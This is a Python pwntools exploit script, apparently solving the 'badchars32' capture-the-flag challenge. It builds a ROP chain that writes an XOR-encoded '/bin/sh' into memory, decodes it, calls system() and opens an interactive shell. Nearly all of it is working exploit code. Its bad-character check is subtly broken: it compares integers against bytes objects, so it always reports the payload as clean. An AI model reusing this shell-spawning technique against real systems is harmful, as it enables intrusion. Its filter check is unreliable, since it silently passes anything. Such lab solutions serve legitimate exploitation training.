#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

from pwn import *
context.log_level = 'debug'

elf = ELF('badchars32')
system_plt = elf.symbols['system']

# ROP gadgets
gadget1 = 0x08048893  # mov dword ptr [edi], esi ; ret
gadget2 = 0x08048899  # pop esi ; pop edi ; ret
gadget3 = 0x08048890  # xor byte ptr [ebx], cl ; ret
gadget4 = 0x08048896  # pop ebx ; pop ecx ; ret

# buffer (acuired by `readelf -S badchars32`)
buf = 0x0804a038

# xor
xor_key = 3

# badchars
def contain_badchars(payload: bytes) -> bool:
    badchars = [b'b', b'i', b'c', b'/', b' ', b'f', b'n', b's']

    for byte in payload:
        if byte in badchars:
            return True
    return False


if __name__ == '__main__':
    proc = elf.process()


    payload = 11 * b'AAAA'          # padding

    payload += p32(gadget2)
    payload += b'\x2c\x61\x6a\x6d'  # esi
    payload += p32(buf)             # edi
    payload += p32(gadget1)         # write to buf

    payload += p32(gadget2)
    payload += b'\x2c\x70h\x00'     # esi
    payload += p32(buf+4)           # edi
    payload += p32(gadget1)         # write to buf + 4

    # Restore badchars with XOR
    for i in range(0, 6):
        payload += p32(gadget4)
        payload += p32(buf+i)       # ebx: badchars address = buf+i
        payload += p32(xor_key)     # ecx
        payload += p32(gadget3)     # xor byte ptr [ebx], cl

    payload += p32(system_plt) + b'AAAA' + p32(buf)
    assert(contain_badchars(payload) == False)

    proc.recvuntil('> ')
    proc.sendline(payload)
    proc.interactive()
